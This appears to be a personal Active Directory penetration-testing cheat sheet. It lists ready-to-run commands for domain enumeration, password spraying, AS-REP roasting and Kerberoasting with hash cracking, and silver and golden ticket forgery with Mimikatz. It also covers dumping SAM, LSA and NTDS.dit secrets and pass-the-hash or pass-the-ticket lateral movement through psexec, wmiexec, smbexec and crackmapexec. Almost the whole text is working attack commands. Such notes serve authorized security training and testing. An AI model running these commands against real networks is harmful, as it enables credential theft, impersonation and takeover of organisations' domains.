# Active Directory

### Active Directory Pentesting

#### Enumeration

To check local administrators in domain joined machine

```bash
net localgroup Administrators
```

#### Powerview

```powershell
Import-Module .\\[PowerView.ps](<http://PowerView.ps>)1  #loading module to powershell, if it gives error then change execution policy
Get-NetDomain  #basic information about the domain
Get-NetUser  #list of all users in the domain
```

* The above command's outputs can be filtered using "select" command. For example, `Get-NetUser | select name`

```powershell
Get-NetGroup  # enumerate domain groups
Get-NetGroup "group name"  # information from specific group
Get-NetComputer  # enumerate the computer objects in the domain
Find-LocalAdminAccess  # scans the network in an attempt to determine if our current user has administrative access
Get-NetSession -ComputerName files04 -Verbose  #Checking logged on users with Get-NetSession
Get-NetUser -SPN | select samaccountname,serviceprincipalname  # Listing SPN accounts in domain
Get-ObjectAcl -Identity USERNAME  # enumerates ACE(access control entities), lists SID(security identifier)
Convert-SidToName SID  # converting SID/ObjSID to name
```

* Checking for "GenericAll" right for a specific group, after obtaining they can be converted to name

```powershell
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier | select -ExpandProperty SecurityIdentifier | Convert-SidToName
Find-DomainShare  #find the shares in the domain
Get-DomainUser -PreauthNotRequired -verbose  # identifying AS-REP roastable accounts
Get-NetUser -SPN | select serviceprincipalname  #Kerberoastable accounts
```

#### Bloodhound

* Collection methods - database
* Sharphound - transfer [sharphound.ps](http://sharphound.ps)1 into the compromised machine

```powershell
Import-Module .\\[Sharphound.ps](<http://Sharphound.ps>)1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp\\ -OutputPrefix "name"
```

* Bloodhound-Python

```bash
bloodhound-python -u 'username' -p 'password' -ns DC_IP -d [DOMAIN.COM](<http://DOMAIN.COM>) -c all  #output will be in json format
```

* Running Bloodhound

```bash
sudo neo4j console
```

* then upload the .json files obtained

#### PsLoggedon

To see user logons at remote system of a domain(external tool)

```bash
PsLoggedon.exe \\\\TARGET_COMPUTER
```

#### Attacking Active Directory Authentication

ðŸ’¡ Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don't have proper creds.

#### Password Spraying

* Crackmapexec - check if the output shows 'Pwned!'

```bash
crackmapexec smb SUBNET_OR_IP -u users.txt -p 'password' -d DOMAIN --continue-on-success
```

* Kerbrute

```bash
kerbrute passwordspray -d [corp.com](<http://corp.com>) users.txt "password"
```

#### AS-REP Roasting

```bash
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD -request  #this gives us the hash
Rubeus.exe asreproast /nowrap  #dumping from compromised windows host
hashcat -m 18200 hashes.txt wordlist.txt --force  # cracking hashes
```

#### Kerberoasting

```bash
Rubeus.exe kerberoast /outfile:hashes.kerberoast  #dumping from compromised windows host
impacket-GetUserSPNs -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD -request  #from kali machine
hashcat -m 13100 hashes.txt wordlist.txt --force  # cracking hashes
```

#### Silver Tickets

* Obtaining hash of an SPN user using Mimikatz

```
privilege::debug
sekurlsa::logonpasswords  #obtain NTLM hash of the SPN account here
```

* Obtaining Domain SID

```powershell
ps> whoami /user
```

* this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain SID is "S-1-5-21-1987370270-658905905-1781884369"
* Forging silver ticket using Mimikatz

```
kerberos::golden /sid:<domainsid> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
exit
```

* we can check the tickets by,

```powershell
ps> klist
```

* Accessing service

```powershell
ps> iwr -UseDefaultCredentials <http://web04.corp.com:8080/>
```

#### Secretsdump

```bash
[secretsdump.py](<http://secretsdump.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

#### Lateral Movement in Active Directory

#### psexec - smbexec - wmiexec - atexec

* Here we can pass the credentials or even hash, depending on what we have

```bash
[psexec.py](<http://psexec.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

* the user should have write access to Admin share then only we can get session

```bash
[psexec.py](<http://psexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[smbexec.py](<http://smbexec.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
[smbexec.py](<http://smbexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[wmiexec.py](<http://wmiexec.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
[wmiexec.py](<http://wmiexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[atexec.py](<http://atexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip> "command"  #we passed full hash here
```

#### winrs

```bash
winrs -r:TARGET_IP -u:USERNAME -p:PASSWORD "command"
```

* run this and check whether the user has access on the machine, if you have access then you can get shell
* run this on windows session

#### crackmapexec

* If stuck make use of Wiki

```bash
crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp}  #supported services

crackmapexec smb SUBNET_OR_IP -u user.txt -p password.txt --continue-on-success  # Bruteforce
crackmapexec smb SUBNET_OR_IP -u user.txt -p password.txt --continue-on-success | grep '[+]'  # Filter successful logins
crackmapexec smb SUBNET_OR_IP -u user.txt -p 'password' --continue-on-success  #Password spraying
crackmapexec smb TARGET_IP -u 'user' -p 'password' --shares  #lists all shares, provide DC ip
crackmapexec smb TARGET_IP -u 'user' -p 'password' --disks
crackmapexec smb DC_IP -u 'user' -p 'password' --users  #we need to provide DC ip
crackmapexec smb TARGET_IP -u 'user' -p 'password' --sessions  #active logon sessions
crackmapexec smb DC_IP -u 'user' -p 'password' --pass-pol  #dumps password policy
crackmapexec smb TARGET_IP -u 'user' -p 'password' --sam  #SAM hashes
crackmapexec smb TARGET_IP -u 'user' -p 'password' --lsa  #dumping lsa secrets
crackmapexec smb DC_IP -u 'user' -p 'password' --ntds  #dumps NTDS.dit file
crackmapexec smb DC_IP -u 'user' -p 'password' --groups {groupname}  #we can also provide --group and it lists all groups
crackmapexec smb TARGET_IP -u 'user' -p 'password' -x 'command'  #For executing commands

#crackmapexec modules
crackmapexec smb -L  #listing modules
crackmapexec smb -M mimikatz --options  #shows the required options for the module
crackmapexec smb TARGET_IP -u 'user' -p 'password' -M mimikatz  #runs default command
crackmapexec smb TARGET_IP -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug sekurlsa::logonpasswords exit'
```

#### Pass the ticket

```
mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi
klist
dir \\\\dc01.corp.local\\c$
```

#### Golden Ticket

```
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /ptt
misc::cmd
klist
dir \\\\dc01.corp.local\\c$
```
